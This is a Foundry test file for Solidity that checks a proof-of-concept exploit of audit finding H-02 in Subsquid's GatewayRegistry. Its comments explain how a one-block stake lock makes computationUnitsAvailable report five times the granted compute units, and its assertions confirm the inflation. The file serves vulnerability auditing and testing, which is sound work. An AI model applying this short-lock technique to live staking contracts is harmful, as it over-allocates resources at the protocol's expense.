// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, GatewayRegistry, CUMarker, MiniToken} from "./31547-h-02-computationunitsavailable-can-overestimate-number-of-av.sol";

// Subsquid H-02 (finding 31547): computationUnitsAvailable computes per-epoch
// units as total * epochLength / (lockEnd - lockStart). With no minimum staking
// duration, a 1-block lock against an epochLength of 5 reports 50 units available
// while only 10 were ever granted -- a 5x free inflation of the peer's allocation.
contract Finding31547Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_shortDurationInflatesComputeUnits() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("granted (total units paid for)", e.granted());
        emit log_named_uint("available (reported per-epoch)", e.available());
        emit log_named_uint("excess (free over-allocation)", e.excess());
        emit log_named_uint("inflation factor", e.inflationFactor());

        assertEq(e.granted(), 10, "peer was granted only 10 total compute units");
        assertEq(e.available(), 50, "computationUnitsAvailable inflates to 50");
        assertGt(e.available(), e.granted(), "availability exceeds total granted");
        assertEq(e.available(), e.granted() * 5, "inflated by a full epochLength (5x)");
        assertEq(e.excess(), 40, "40 free compute units over-allocated");

        CUMarker marker = e.marker();
        assertEq(marker.balanceOf(SINK), 40, "over-allocation harm recorded to SINK");
    }
}
